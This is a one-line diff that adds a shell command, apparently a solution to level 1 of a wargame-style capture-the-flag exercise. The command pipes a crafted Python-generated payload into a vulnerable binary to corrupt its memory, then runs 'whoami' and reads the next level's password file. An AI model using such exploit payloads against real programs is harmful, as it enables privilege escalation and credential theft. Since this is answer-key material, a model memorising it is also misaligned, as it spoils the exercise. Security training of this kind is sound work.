@@ -1,0 +1,1 @@
+python -c 'print  "\\"*0x101+"\xcaA\n"+"A"*4000+"\nwhoami\ncat /etc/vortex_pass/vortex2"' |/vortex/vortex1
